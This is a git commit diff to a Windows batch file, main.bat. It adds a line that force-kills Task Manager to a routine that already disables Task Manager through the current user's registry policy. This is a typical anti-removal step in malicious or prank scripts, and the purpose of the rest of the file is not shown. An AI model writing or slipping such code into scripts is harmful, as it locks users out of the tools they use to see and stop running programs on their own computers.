67fa1e2f8a434665bb030d6406b6b201eeaf8035
Fan-Of-Game <let0685@gmail.com>
2026-07-18 16:07:27 +0200

    Update main.bat

--- main.bat
+++ main.bat
@@ -20,4 +20,5 @@ goto :eof
 
 :NoTaskMGR
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
+taskkill /IM taskmgr.exe /F 2>nul
 goto :eof
